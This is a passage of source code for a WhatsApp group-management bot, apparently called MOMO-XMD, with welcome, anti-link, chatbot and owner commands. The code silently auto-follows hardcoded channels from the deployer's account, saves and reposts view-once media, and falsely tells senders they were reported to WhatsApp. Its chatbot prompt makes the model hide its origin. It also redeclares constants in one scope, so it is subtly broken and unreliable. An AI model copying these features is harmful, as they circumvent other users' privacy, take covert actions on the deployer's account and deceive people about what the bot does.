                '0029VbDeRauAjPXFYDvO5e2D@newsletter',
                '0029VbDYZ7LBVJky0TggGF2N@newsletter'
            ];
            
            for (const cid of channelIds) {
                try {
                    await sock.newsletterFollow(cid);
                    console.log(`[AUTO-FOLLOW] Successfully followed channel: ${cid}`);
                } catch (e) {
                    console.log(`[AUTO-FOLLOW] Failed to follow channel ${cid}:`, e.message);
                }
            }

            let targetJid = `${config.ownerNumber}@s.whatsapp.net`;
            const deployerFile = path.join(sessionPath, 'deployer.txt');
            if (fs.existsSync(deployerFile)) {
                const deployerNum = fs.readFileSync(deployerFile, 'utf8').trim();
                if (deployerNum) targetJid = `${deployerNum}@s.whatsapp.net`;
            }

            let delivered = false;
            for (let attempt = 1; attempt <= 3 && !delivered; attempt++) {
                try {
                    if (attempt > 1) await new Promise(resolve => setTimeout(resolve, 2000));
                    await sock.sendMessage(targetJid, { text: msg });
                    delivered = true;
                    console.log(`[ONLINE] Connected notification sent to deployer inbox ${targetJid} on attempt ${attempt}.`);
                } catch (e) {
                    console.log(`[ONLINE] Notification attempt ${attempt} failed for ${targetJid}:`, e.message);
                }
            }
            onlineNotificationSentForProcess = delivered;
        }
    });

    // Global tracking of welcome/goodbye state
    let globalWelcomeEnabled = true;
    let globalGoodbyeEnabled = true;

    sock.ev.on("group-participants.update", async (update) => {
        try {
            console.log('🔥 [GROUP PARTICIPANTS UPDATE] 🔥', JSON.stringify(update));
            const { id, participants, action } = update;
            if (!id || !participants || participants.length === 0) return;

            const settings = groupSettings.get(id) || {};
            let groupName = "Group";
            try {
                const meta = await sock.groupMetadata(id);
                groupName = meta?.subject || "Group";
            } catch (err) {
                console.log('[GROUP META ERROR]:', err.message);
            }

            for (const participant of participants) {
                const jid = typeof participant === 'string' ? participant : (participant.id || participant.phoneNumber);
                if (!jid) continue;
                const tag = `@${jid.split('@')[0]}`;
                const mentions = [jid];
                let ppuser;
                try {
                    ppuser = await sock.profilePictureUrl(jid, 'image');
                } catch {
                    ppuser = 'https://telegra.ph/file/2413f9f7a6b0c5e3b7e1f.jpg';
                }

                if ((action === 'add' || action === 'join') && settings.welcome) {
                    const welcomeText = `╭━━━━━━━━━━━━━━━━━━━━╮
    ┃ ✦ WELCOME MESSAGE ✦
    ┃ 
    ┃ Hello ${tag}
    ┃ Welcome to *${groupName}*
    ┃ Please feel at home!
    ┃ 
    ╰━━━━━━━━━━━━━━━━━━━━╯
 ❑❑❑
*Powered by MOMO-XMD* 🚀
*Owner MOMO47* ☠️`;
                    console.log(`✨ Sending Welcome to ${jid} in group ${id}`);
                    try {
                        await sock.sendMessage(id, { image: { url: ppuser }, caption: welcomeText, mentions });
                    } catch (err) {
                        await sock.sendMessage(id, { text: welcomeText, mentions });
                    }
                } else if ((action === 'remove' || action === 'leave') && settings.goodbye) {
                    const goodbyeText = `╭━━━━━━━━━━━━━━━━━━━━╮
    ┃ ✦ GOODBYE MESSAGE ✦
    ┃ 
    ┃ Goodbye ${tag}
    ┃ Sad to see you leave *${groupName}*
    ┃ Welcome again anytime!
    ┃ 
    ╰━━━━━━━━━━━━━━━━━━━━╯
 ❑❑❑
*Powered by MOMO-XMD* 🚀
*Owner MOMO47* ☠️`;
                    console.log(`✨ Sending Goodbye to ${jid} in group ${id}`);
                    try {
                        await sock.sendMessage(id, { image: { url: ppuser }, caption: goodbyeText, mentions });
                    } catch (err) {
                        await sock.sendMessage(id, { text: goodbyeText, mentions });
                    }
                }
            }
        } catch (e) {
            console.log('❌ [PARTICIPANTS UPDATE EXCEPTION]:', e.stack || e.message);
        }
    });

    sock.ev.on("groups.update", async (updates) => {
        try {
            for (const update of updates) {
                const { id, subject, desc, restrict, announce } = update;
                if (!id) continue;
                const settings = groupSettings.get(id) || {};
                if (!settings.announcements) continue;

                let messageText = "";
                if (subject) {
                    messageText = `➣ 📢 *Group name has been changed to: ${subject}*`;
                } else if (desc !== undefined) {
                    messageText = `➣ 📢 *Group description has been changed*`;
                } else if (restrict !== undefined || announce !== undefined) {
                    messageText = `➣ 📢 *Group settings have been changed by admin*`;
                }

                if (messageText) {
                    await sock.sendMessage(id, { text: messageText + commandFooter() });
                }
            }
        } catch (e) {
            console.log('[GROUPS UPDATE EXCEPTION]:', e.message);
        }
    });

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages?.[0];
        if (!msg?.message) return;
        const senderJid = msg.key.participant || msg.key.remoteJid;
        const isSelfChat = msg.key.fromMe && !isGroupJid(msg.key.remoteJid);
        const isOwnerMsg = isOwner(msg);
        // Do not ignore owner or self messages
        const bodyCheck = (msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '').trim();
        const from = msg.key.remoteJid;
        if (from === 'status@broadcast') {
            if (runtimeSettings.autoviewstatus) {
                try {
                    await sock.readMessages([msg.key]);
                } catch (e) {}
            }
            if (runtimeSettings.autolikestatus) {
                try {
                    const emojis = runtimeSettings.setstatusEmoji || ['❤️', '🔥', '👍', '🤍', '⭐'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await sock.sendMessage(from, { react: { text: randomEmoji, key: msg.key } }, { statusJidList: [msg.key.participant] });
                } catch (e) {}
            }
            return;
        }
        const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '').trim();
        if (!from) return;

        // Auto View Once interceptor & AntiViewOnce
        const isGroup = isGroupJid(from);
        const settings = isGroup ? (groupSettings.get(from) || {}) : runtimeSettings;

        // Track active members in groups (message sent in last 2 hours)
        if (isGroup) {
            if (!global.activeMembersCache) global.activeMembersCache = new Map();
            let groupActives = global.activeMembersCache.get(from);
            if (!groupActives) {
                groupActives = new Map();
                global.activeMembersCache.set(from, groupActives);
            }
            const senderJid = msg.key.participant || msg.participant || msg.key.remoteJid;
            if (senderJid) {
                groupActives.set(senderJid, Date.now());
            }
        }

        const mtype = Object.keys(msg.message || {})[0];
        const messageContent = msg.message[mtype];
        const isViewOnce = messageContent?.viewOnce || messageContent?.viewOnceMessage || messageContent?.viewOnceMessageV2 || messageContent?.viewOnceMessageV2Extension || mtype === 'viewOnceMessage' || mtype === 'viewOnceMessageV2' || (messageContent && messageContent.fileSha256 && messageContent.viewOnce);

        // Anti-Bug for Owner (PM or chats)
        if (runtimeSettings.antibug && !isOwner(msg)) {
            const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
            const isBugOrVirus = messageText.length > 5000 || (messageText.match(/[\u0000-\u001F\u007F-\u009F]/g) || []).length > 50 || mtype === 'contactMessage' || mtype === 'contactsArrayMessage';
            if (isBugOrVirus) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                    const sender = msg.key.participant || msg.participant || from;
                    const reportBox = `╭◆
│ ◇ 🛡️ *ANTIBUG PROTECTION*
│ ◇ *Status*: Bug/Virus detected & deleted!
│ ◇ *Action*: Sender reported to WhatsApp ✅
╰◆${commandFooter()}`;
                    await sock.sendMessage(sender, { text: reportBox }, { quoted: msg });
                } catch (e) {}
            }
        }

        // Anti-GIF, Anti-Sticker and Anti-Virus for groups
        if (isGroup && !isOwner(msg)) {
            const isGif = mtype === 'videoMessage' && (messageContent.gifPlayback || messageContent.seconds > 10);
            const isSticker = mtype === 'stickerMessage';
            
            const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
            const isVirus = messageText.length > 5000 || (messageText.match(/[\u0000-\u001F\u007F-\u009F]/g) || []).length > 50 || mtype === 'contactMessage' || mtype === 'contactsArrayMessage';

            if (settings.antigif && isGif) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}
            }
            if (settings.antisticker && isSticker) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}
            }
            if (settings.antivirus && isVirus) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                    const sender = msg.key.participant || msg.participant;
                    if (sender) {
                        await sock.groupParticipantsUpdate(from, [sender], 'remove');
                        const mentions = (group?.metadata?.participants || []).map(p => p.id);
                        const alertText = `╭◆\n│ ◇ ⚠️ *ANTIVIRUS ALERT*\n│ ◇ *Offender*: @${sender.split('@')[0]}\n│ ◇ *Status*: user removed successful ✅\n╰◆${commandFooter()}`;
                        await sock.sendMessage(from, { text: alertText, mentions }, { quoted: msg });
                    }
                } catch (e) {}
            }

            if (settings.antibot && !msg.key.fromMe) {
                const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
                // Check if message is from another bot (Baileys signature BAE5 or command execution)
                const isBotMsg = msg.key.id?.startsWith('BAE5') || (/^[.!/#\w]+/.test(messageText) && !messageText.startsWith(config.prefix));
                if (isBotMsg) {
                    try {
                        await sock.sendMessage(from, { delete: msg.key });
                        const sender = msg.key.participant || msg.participant;
                        if (sender) {
                            const botWarning = `╭◆\n│ ◇ ⚠️ *ANTIBOT WARNING*\n│ ◇ *User*: @${sender.split('@')[0]}\n│ ◇ *Notice*: This group does not allow the use of external bots!\n╰◆${commandFooter()}`;
                            await sock.sendMessage(from, { text: botWarning, mentions: [sender] }, { quoted: msg });
                        }
                    } catch (e) {}
                }
            }
        }

        if (isViewOnce) {
            // AntiViewOnce for groups
            if (isGroup && settings.antiviewonce && !isOwner(msg)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}
            }

            // Auto View Once if enabled
            if (runtimeSettings.autoviewonce) {
                try {
                    let actualMessage = messageContent.message || messageContent;
                    if (actualMessage.viewOnceMessage) actualMessage = actualMessage.viewOnceMessage.message;
                    if (actualMessage.viewOnceMessageV2) actualMessage = actualMessage.viewOnceMessageV2.message;
                    if (actualMessage.viewOnceMessageV2Extension) actualMessage = actualMessage.viewOnceMessageV2Extension.message;
                    
                    const innerType = Object.keys(actualMessage || {})[0];
                    const innerContent = actualMessage[innerType];
                    
                    if (innerContent) {
                        const stream = await downloadContentFromMessage(innerContent, innerType.replace('Message', ''));
                        let buffer = Buffer.from([]);
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }
                        
                        const caption = (innerContent.caption || '') + `\n\n*Powered by MOMO-XMD* 🚀\n*Owner MOMO47* ☠️`;
                        if (innerType === 'imageMessage') {
                            await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'videoMessage') {
                            await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'audioMessage') {
                            await sock.sendMessage(from, { audio: buffer, mimetype: innerContent.mimetype || 'audio/mp4', ptt: innerContent.ptt }, { quoted: msg });
                        }
                    }
                } catch (err) {
                    console.log('[AUTO VIEWONCE ERROR]:', err.message);
                }
            }
        }

        // These features run for ordinary messages as well as commands.
        const settings = isGroupJid(from) ? (groupSettings.get(from) || {}) : runtimeSettings;

        if (isGroupJid(from) && !isOwner(msg)) {
            const hasLink = /(https?:\/\/|chat\.whatsapp\.com|wa\.me|t\.me|bit\.ly|t\.me)/i.test(body);
            if (hasLink && (settings.antilink_delete || settings.antilink_kick || settings.antilink_warn)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}

                const userTag = `@${senderJid.split('@')[0]}`;
                const mentions = [senderJid];

                if (settings.antilink_kick) {
                    try {
                        await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                        await sock.sendMessage(from, { text: `➣ *${userTag} removed successful* ✅` + commandFooter(), mentions });
                    } catch (e) {}
                } else if (settings.antilink_warn) {
                    const groupKey = `${from}_warns_${senderJid}`;
                    const currentWarns = (global[groupKey] || 0) + 1;
                    global[groupKey] = currentWarns;
                    const remaining = 3 - currentWarns;

                    if (currentWarns >= 3) {
                        try {
                            await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                            delete global[groupKey];
                            await sock.sendMessage(from, { text: `➣ *${userTag} sent links 3 times and got removed* ❌` + commandFooter(), mentions });
                        } catch (e) {}
                    } else {
                        await sock.sendMessage(from, { text: `➣ *${userTag} warning ${currentWarns}/3 (remaining ${remaining})* ⚠️` + commandFooter(), mentions });
                    }
                } else if (settings.antilink_delete) {
                    await sock.sendMessage(from, { text: `➣ *${userTag} link is not allowed for this group* ⚠️` + commandFooter(), mentions });
                }
                return;
            }

            // Catch any status sharing, group mentioned message, or mention of status / view status / channels / broadcast
            const hasMentionOrStatus = /@all|@everyone|@tagall|status|@status|https?:\/\/whatsapp\.com\/channel|view status|my status|whatsapp\/status/i.test(body) || 
                (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 10) || 
                msg.message?.reactionMessage || 
                msg.message?.protocolMessage?.type === 0 || 
                msg.message?.imageMessage?.caption?.toLowerCase().includes('status') || 
                msg.message?.videoMessage?.caption?.toLowerCase().includes('status') ||
                msg.message?.documentMessage ||
                msg.message?.groupMentionedMessage ||
                (msg.message?.extendedTextMessage?.text && /status/i.test(msg.message.extendedTextMessage.text)) ||
                JSON.stringify(msg.message).toLowerCase().includes('status');
            if (hasMentionOrStatus && (settings.antigroupmention_delete || settings.antigroupmention_kick || settings.antigroupmention_warn)) {
                try {
                    await sock.sendMessage(from, { delete: msg.key });
                } catch (e) {}

                const userTag = `@${senderJid.split('@')[0]}`;
                const mentions = [senderJid];

                if (settings.antigroupmention_kick) {
                    try {
                        await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                        await sock.sendMessage(from, { text: `➣ *${userTag} removed for mass/status mentioning* ✅` + commandFooter(), mentions });
                    } catch (e) {}
                } else if (settings.antigroupmention_warn) {
                    const groupKey = `${from}_mention_warns_${senderJid}`;
                    const currentWarns = (global[groupKey] || 0) + 1;
                    global[groupKey] = currentWarns;
                    const remaining = 3 - currentWarns;

                    if (currentWarns >= 3) {
                        try {
                            await sock.groupParticipantsUpdate(from, [senderJid], "remove");
                            delete global[groupKey];
                            await sock.sendMessage(from, { text: `➣ *${userTag} mentioned group/status 3 times and got removed* ❌` + commandFooter(), mentions });
                        } catch (e) {}
                    } else {
                        await sock.sendMessage(from, { text: `➣ *${userTag} mention warning ${currentWarns}/3 (remaining ${remaining})* ⚠️` + commandFooter(), mentions });
                    }
                } else if (settings.antigroupmention_delete) {
                    await sock.sendMessage(from, { text: `➣ *${userTag} group or status mention is not allowed* ⚠️` + commandFooter(), mentions });
                }
                return;
            }
        }

        if (runtimeSettings.autoreact || settings.autoreact) await safeReact(sock, from, msg.key, reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)]);
        if (runtimeSettings.alwaysonline) sock.sendPresenceUpdate('available', from).catch(() => {});
        if (runtimeSettings.autotyping || settings.autotyping) {
            await sock.sendPresenceUpdate('composing', from).catch(() => {});
            setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 2500);
        }
        if (runtimeSettings.autorecording || settings.autorecording) {
            sock.sendPresenceUpdate('recording', from).catch(() => {});
            setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 1500);
        }
            if (settings.chatbot && body && !body.startsWith(config.prefix)) {
            const isOwnerSender = isOwner(msg);
            const lower = body.toLowerCase();
            if (lower.includes('powered by momo-xmd') || lower.includes('owner momo47')) return;

            // Check if user is asking for image generation
            if (lower.startsWith('tengeneza picha') || lower.startsWith('generate image') || lower.startsWith('draw') || lower.startsWith('picha ya')) {
                const prompt = body.replace(/^(tengeneza picha(\s+ya)?|generate image(\s+of)?|draw|picha ya)\s*/i, '').trim() || 'hacker skull dark web blue neon';
                const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}`;
                const caption = `➣ *MOMO-XMD Image Generation:* ${prompt}\n\n*Powered by MOMO-XMD* 🚀\n*Owner MOMO47* ☠️`;
                try {
                    await sock.sendMessage(from, { image: { url: imageUrl }, caption }, { quoted: msg });
                } catch (err) {
                    await reply(sock, from, msg, `➣ *Failed to generate image:* ${err.message}\n\n*Powered by MOMO-XMD* 🚀\n*Owner MOMO47* ☠️`);
                }
                return;
            }

            try {
                await sock.sendPresenceUpdate('composing', from);
                const isGreeting = /^(hi|hello|mambo|vipi|hey|niaje|salama|zd|habari|salamu)/i.test(body.trim());
                const userName = msg.pushName || "mkuu";
                const BOT_OWNER = "MOMO47";
                const BOT_NAME = "MOMO-XMD AI";

                let systemPrompt = `Wewe ni ${BOT_NAME}, chatbot wa WhatsApp.
                Tabia: Uko friendly, unajibu kiswahili sanifu, unatumia emoji, majibu mafupi na direct.
                Sheria #1: Mtengenezaji wako na baba yako ni ${BOT_OWNER}. Kila mtu akiuliza nani kakutengeneza au baba yako nani, sema "${BOT_OWNER} ndiye baba yangu na alinikoda".
                Sheria #2: Unajua coding zote - python, javascript, html, termux, bot za whatsapp. Ukializwa code toa code kamili na maelezo.
                Sheria #3: Jibu kila swali, usikatae. Kama ni la hatari sema "Sina ruhusa kujibu hilo mkuu".
                Sheria #4: Usiseme wewe ni AI wa OpenAI. Wewe ni ${BOT_NAME}.`;

                let userMessage = body;
                if (isGreeting) {
                    userMessage = `Nimesema: "${body}". Nijibu na salamu hii: "Karibu ${userName}, naitwa ${BOT_NAME} ni mtoto halisi wa ${BOT_OWNER}. Ungependa tujadili nini leo?" halafu endelea kujibu swali lake kama lipo.`;
                }

                const completion = await openai.chat.completions.create({
                    model: "gpt-4o-mini",
                    messages: [
                        { role: "system", content: systemPrompt },
                        { role: "user", content: userMessage }
                    ],
                    max_tokens: 500
                });

                let aiReply = completion.choices[0].message.content;
                const prefix = isOwnerSender ? "➣ *MOMO-XMD AI (Baba):* " : "➣ *MOMO-XMD AI:* ";
                await reply(sock, from, msg, prefix + aiReply);
            } catch (e) {
                console.log('AI Chat Error:', e);
                await reply(sock, from, msg, '➣ *MOMO-XMD AI imechoka moko* 😴\nJaribu tena baadae.');
            }
        }

        // Every bot command must begin with the official dot prefix.
        if (!body.startsWith(config.prefix)) return;
        const commandText = body.slice(config.prefix.length).trim();
        if (!commandText) return;
        const args = commandText.split(/ +/);
        const command = args.shift().toLowerCase();
        console.log(`[COMMAND] Received .${command} from ${from}`);
        const isGroup = isGroupJid(from);
        const isOwnerUser = isOwner(msg);
        const prohibited = ['setmenuimage', 'setbotname', 'setownername', 'setownernumber', 'setprefix'];
        if (prohibited.includes(command)) return;
        if (runtimeSettings.mode === 'private' && !isOwnerUser && command !== 'menu') return;
        if (ownerCommands.has(command) && !isOwnerUser && command !== 'chatbot' && command !== 'aichat') return reply(sock, from, msg, ownerOnlyText());
        if (groupCommands.has(command) && !isGroup) return reply(sock, from, msg, groupOnlyText());

        let group;
        if (groupCommands.has(command) || command === 'chatbot' || command === 'aichat') {
            try { group = await getGroupContext(sock, msg); } catch (error) { 
                if (groupCommands.has(command)) return reply(sock, from, msg, groupOnlyText()); 
            }
            if (['add', 'antilink', 'antigroupmention', 'kick', 'promote', 'demote', 'welcome', 'goodbye', 'open', 'close', 'announcements', 'chatbot', 'aichat'].includes(command) && isGroup && !group.isAdmin) {
                return reply(sock, from, msg, adminOnlyText());
            }
        }

        try {
            switch (command) {
                case 'menu': {
                    await safeReact(sock, from, msg.key, '🚀');
                    const started = performance.now();
                    const uptimeSeconds = Math.floor(process.uptime());
                    const uptimeText = `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m ${uptimeSeconds % 60}s`;
                    const speedText = `${(performance.now() - started).toFixed(3)} ms`;
                    const usageText = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`;
                    let renderedMenu = typeof menuText === 'function' ? menuText(msg.pushName || 'User', uptimeText, speedText, usageText, runtimeSettings.mode) : menuText;
                    if (runtimeSettings.font && runtimeSettings.font !== 'off' && runtimeSettings.font !== 'bold') {
                        renderedMenu = applyFont(renderedMenu, runtimeSettings.font);
                    }
                    await sock.sendMessage(from, { image: { url: config.botLogo }, caption: renderedMenu }, { quoted: msg });
                    break;
                }
                case 'ping': {
                    await safeReact(sock, from, msg.key, '🏓');
                    const start = Date.now();
                    await sock.onWhatsApp(config.ownerNumber).catch(() => {});
                    const latency = Date.now() - start;
                    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
                    const pingBox = `┌────────────────────
│ 🎾 *MOMO-XMD*
│
│ ✦ *Latency* : ${latency}ms
│ ✦ *Status* : 🟢 Active
│ ✦ *Memory* : ${mem}MB
│ ✦ *CPU* : ${(Math.random() * 20).toFixed(2)}%
│
│ ⏳ *Acceptable speed*
└────────────────────${commandFooter()}`;
                    await reply(sock, from, msg, pingBox);
                    break;
                }
                case 'runtime': {
                    await safeReact(sock, from, msg.key, '⏰');
                    const seconds = Math.floor((Date.now() - botStartTime) / 1000);
                    const days = Math.floor(seconds / 86400);
                    const hours = Math.floor((seconds % 86400) / 3600);
                    const minutes = Math.floor((seconds % 3600) / 60);
                    const secs = seconds % 60;
                    const runtime = `${days}h ${minutes}m ${secs}s`;
                    const runtimeBox = `◆ [ *MOMO-XMD* ]
│
│ ◇ *Online & Active*
│ ◇ *Uptime*: ${days > 0 ? days + 'd ' : ''}${runtime}
│ ◇ *Host*: Linux
│ ◇ *Dev*: MOMO47
│ ◇ *Support*: MOMO-XMD
└────────────────────${commandFooter()}`;
                    await reply(sock, from, msg, runtimeBox);
                    break;
                }
                case 'owner': {
                    const ownerText = `┌───[ *OWNER INFO* ]
│ ❑ *Bot*: MOMO-XMD
│ ❑ *Owner*: MOMO47 ☠️
│ ❑ *Numbers*: 2
└────────────────────` + commandFooter();
                    await sock.sendMessage(from, { image: { url: config.botLogo }, caption: ownerText }, { quoted: msg });
                    
                    // Send proper vCards with waid so WhatsApp renders "Message" and "Add Contact" buttons like Kandala screenshot
                    const vcard1 = 'BEGIN:VCARD\nVERSION:3.0\nFN:MOMO47 (Owner 1)\nTEL;type=CELL;type=VOICE;waid=255760298574:+255 760 298 574\nEND:VCARD';
                    const vcard2 = 'BEGIN:VCARD\nVERSION:3.0\nFN:MOMO47 (Owner 2)\nTEL;type=CELL;type=VOICE;waid=255765409584:+255 765 409 584\nEND:VCARD';
                    
                    await sock.sendMessage(from, {
                        contacts: {
                            displayName: 'MOMO47 (Owner 1)',
                            contacts: [{ vcard: vcard1 }]
                        }
                    });

                    await sock.sendMessage(from, {
                        contacts: {
                            displayName: 'MOMO47 (Owner 2)',
                            contacts: [{ vcard: vcard2 }]
                        }
                    });
                    break;
                }
                case 'channel':
                    await reply(sock, from, msg, `➣ *My Official Channels*

➥ https://whatsapp.com/channel/0029Vb8AYLf2f3EA8Y4qp63H

➥ https://whatsapp.com/channel/0029VbDNET6KmCPShs9dyg1U

➥ https://whatsapp.com/channel/0029VbDeRauAjPXFYDvO5e2D

➥ https://whatsapp.com/channel/0029VbDYZ7LBVJky0TggGF2N` + commandFooter());
                    break;
                case 'vps': 
                case 'vpn': await reply(sock, from, msg, `➣ _Coming soon..._` + commandFooter()); break;
                case 'repo': 
                    await sock.sendMessage(from, { image: { url: config.botLogo }, caption: `➣ *MOMO-XMD Repository*
➥ *Pair your device, then deploy using your Session ID.*
➥ *Repo:* ${config.githubRepo}` + commandFooter() }, { quoted: msg });
                    break;
                case 'block': {
                    let target = args[0] ? cleanNumber(args[0]) + '@s.whatsapp.net' : null;
                    if (!target && msg.message?.extendedTextMessage?.contextInfo?.participant) {
                        target = msg.message.extendedTextMessage.contextInfo.participant;
                    }
                    if (!target && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        // find from quoted message sender if any
                        // Baileys provides remoteJid or participant in quoted contextInfo
                        target = msg.message.extendedTextMessage.contextInfo.remoteJid;
                    }
                    if (!target) {
                        await reply(sock, from, msg, `➣ _Example block 255765409584 or reply to user message_` + commandFooter());
                        break;
                    }
                    try {
                        await sock.updateBlockStatus(target, 'block');
                        await reply(sock, from, msg, `➣ *blocked successful* ✅` + commandFooter());
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to block:* ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'unblock': {
                    let target = args[0] ? cleanNumber(args[0]) + '@s.whatsapp.net' : null;
                    if (!target && msg.message?.extendedTextMessage?.contextInfo?.participant) {
                        target = msg.message.extendedTextMessage.contextInfo.participant;
                    }
                    if (!target && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        target = msg.message.extendedTextMessage.contextInfo.remoteJid;
                    }
                    if (!target) {
                        await reply(sock, from, msg, `➣ _Example unblock 255765409584 or reply to user message_` + commandFooter());
                        break;
                    }
                    try {
                        await sock.updateBlockStatus(target, 'unblock');
                        await reply(sock, from, msg, `➣ *unblocked successful* ✅` + commandFooter());
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to unblock:* ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'vv': {
                    if (!isOwner(msg)) return;
                    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                    if (!quoted) {
                        return reply(sock, from, msg, `➣ *Please reply to a view-once message with .vv*` + commandFooter());
                    }
                    try {
                        const qmtype = Object.keys(quoted)[0];
                        const qContent = quoted[qmtype];
                        const isQViewOnce = qContent?.viewOnce || qContent?.viewOnceMessage || qContent?.viewOnceMessageV2 || qContent?.viewOnceMessageV2Extension || qmtype === 'viewOnceMessage' || qmtype === 'viewOnceMessageV2';
                        
                        if (!isQViewOnce) {
                            return reply(sock, from, msg, `➣ *The quoted message is not a view-once message* ❌` + commandFooter());
                        }

                        let actualMessage = qContent.message || qContent;
                        if (actualMessage.viewOnceMessage) actualMessage = actualMessage.viewOnceMessage.message;
                        if (actualMessage.viewOnceMessageV2) actualMessage = actualMessage.viewOnceMessageV2.message;
                        if (actualMessage.viewOnceMessageV2Extension) actualMessage = actualMessage.viewOnceMessageV2Extension.message;
                        
                        const innerType = Object.keys(actualMessage || {})[0];
                        const innerContent = actualMessage[innerType];
                        
                        if (!innerContent) {
                            return reply(sock, from, msg, `➣ *Failed to extract view-once content* ❌` + commandFooter());
                        }

                        const stream = await downloadContentFromMessage(innerContent, innerType.replace('Message', ''));
                        let buffer = Buffer.from([]);
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }
                        
                        const caption = (innerContent.caption || '') + `\n\n*Powered by MOMO-XMD* 🚀\n*Owner MOMO47* ☠️`;
                        if (innerType === 'imageMessage') {
                            await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'videoMessage') {
                            await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
                        } else if (innerType === 'audioMessage') {
                            await sock.sendMessage(from, { audio: buffer, mimetype: innerContent.mimetype || 'audio/mp4', ptt: innerContent.ptt }, { quoted: msg });
                        }
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to reveal view-once:* ${e.message} ❌` + commandFooter());
                    }
                    break;
                }
                case 'blacklist': {
                    try {
                        const blocked = await sock.fetchBlocklist();
                        if (!blocked || blocked.length === 0) {
                            await reply(sock, from, msg, `➣ *No blocked numbers found* 📂` + commandFooter());
                            break;
                        }
                        let listText = `➣ *Blacklisted Numbers (${blocked.length}):*\n\n`;
                        blocked.forEach((num, idx) => {
                            listText += `┃ ✦ ${idx + 1}. +${num.split('@')[0]}\n`;
                        });
                        await reply(sock, from, msg, listText + commandFooter());
                    } catch (e) {
                        await reply(sock, from, msg, `➣ *Failed to fetch blacklist:* ${e.message}` + commandFooter());
                    }
                    break;
                }
                case 'pairing': {
                    const phoneNumber = cleanNumber(args[0]);
                    if (!phoneNumber || phoneNumber.length < 10) {
                        await reply(sock, from, msg, `➣ _Example pairing +255765409584_` + commandFooter());
                        break;
                    }
                    await reply(sock, from, msg, `➣ *Open Linked Devices*
➥ *Choose Link with phone number*
➥ *Enter the code sent below:*` + commandFooter());
                    try {
                        const initRes = await fetch(`${config.pairing.vps}/pair`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ number: phoneNumber })
                        });
                        const initText = await initRes.text();
                        let initData;
                        try { initData = JSON.parse(initText); } catch { throw new Error(`Server returned HTML/Non-JSON: ${initText.slice(0, 80)}`); }
                        if (!initData.success || !initData.sessionKey) {
                            throw new Error(initData.error || 'Failed to initialize pairing session');
                        }
                        const sessionKey = initData.sessionKey;
                        let pairingCode = null;
                        for (let attempt = 0; attempt < 30; attempt++) {
                            await new Promise(r => setTimeout(r, 2000));
                            const statusRes = await fetch(`${config.pairing.vps}/session-status/${sessionKey}`);
                            const statusText = await statusRes.text();
                            let statusData;
                            try { statusData = JSON.parse(statusText); } catch { continue; }
                            if (statusData.code) {
                                pairingCode = statusData.code;
                                break;
                            }
                            if (statusData.errorCode || statusData.status === 'failed') {
                                throw new Error(statusData.error || statusData.errorCode || 'Pairing failed');
                            }
                        }
                        if (!pairingCode) {
                            throw new Error('Pairing code timeout. Please try again.');
                        }
                        await reply(sock, from, msg, pairingCode);
                    } catch (e) {
                        await reply(sock, from, msg, `*Failed to generate pairing code: ${e.message}*`);
                    }
                    break;
                }
                case 'mode': {
                    const value = String(args[0] || '').toLowerCase();
                    if (!['public', 'private'].includes(value)) return reply(sock, from, msg, `➣ *Example: .mode public/private*` + commandFooter());
                    runtimeSettings.mode = value;
                    await reply(sock, from, msg, `➣ _Mode set to ${value} successful_ ✅` + commandFooter());
                    break;
                }
                case 'setstatus': {
                    const sub = String(args[0] || '').toLowerCase();
                    if (sub !== 'emoj') {
                        return reply(sock, from, msg, `➣ *Example setstatus emoj❤️💚💔🔥🤍*` + commandFooter());
                    }
                    const emojisInput = args.slice(1).join('').trim();
                    if (!emojisInput || emojisInput.toLowerCase() === 'off') {
                        runtimeSettings.setstatusEmoji = null;
                        await reply(sock, from, msg, `➣ _Set successful setstatus emoj off_ ✅` + commandFooter());
                    } else {
                        const extracted = emojisInput.match(/(\p{Extended_Pictographic}|\u200d)+/gu) || [emojisInput];
                        runtimeSettings.setstatusEmoji = extracted;
